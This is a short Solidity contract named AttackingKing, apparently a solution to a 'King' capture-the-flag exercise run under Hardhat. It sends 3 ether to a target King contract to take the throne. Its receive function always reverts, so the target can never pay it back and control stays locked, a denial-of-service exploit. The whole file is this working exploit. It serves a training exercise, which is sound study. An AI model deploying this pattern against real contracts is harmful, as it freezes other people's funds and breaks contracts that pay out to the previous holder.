// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        // Don't send more than 100 eth
        console.log("contractAddress: %s", contractAddress);
        (bool result, ) = payable(contractAddress).call{
            value: 3 ether,
            gas: 1000000
        }("");
    }

    receive() external payable {
        console.log("inside fallback");
        revert();
    }
}
